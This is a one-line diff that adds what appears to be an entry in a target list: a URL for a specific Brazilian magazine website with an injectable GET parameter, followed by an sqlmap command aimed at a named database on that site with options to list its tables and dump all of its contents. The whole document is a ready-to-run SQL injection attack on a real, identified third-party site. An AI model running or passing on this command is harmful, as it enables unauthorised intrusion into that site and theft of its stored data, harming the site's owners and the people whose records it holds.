@@ -1,0 +1,1 @@
+http://www.frimagazine.com.br/detalhes.php?idCliente=1262 (GET)  # sqlmap.py -u http://www.frimagazine.com.br/detalhes.php?idCliente=1262 -D u525666986_db --tables --dump-all --threads=5 -v3
